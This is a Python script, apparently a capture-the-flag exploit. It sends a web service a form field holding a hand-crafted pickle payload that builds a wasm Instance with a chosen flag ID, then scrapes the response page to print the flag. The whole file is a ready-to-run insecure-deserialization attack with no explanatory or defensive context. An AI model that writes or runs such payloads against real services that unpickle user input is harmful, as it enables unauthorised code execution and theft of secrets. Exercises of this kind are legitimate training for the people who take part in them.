import requests, argparse, uuid
from bs4 import BeautifulSoup

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("base_url")
	parser.add_argument("id")
	args = parser.parse_args()

	exploit_id = str(uuid.uuid4())
	flag_id = args.id

	response = requests.post(args.base_url, data={
		"id": exploit_id,
		"code": "print(instance.config.config)",
		"config": f"cwasm\nInstance\n(S'{flag_id}'\ntR.",
	}).text

	soup = BeautifulSoup(response, 'html.parser')
	stdout = soup.find(id="f_stdout").get_text()
	print("Flag:", stdout)
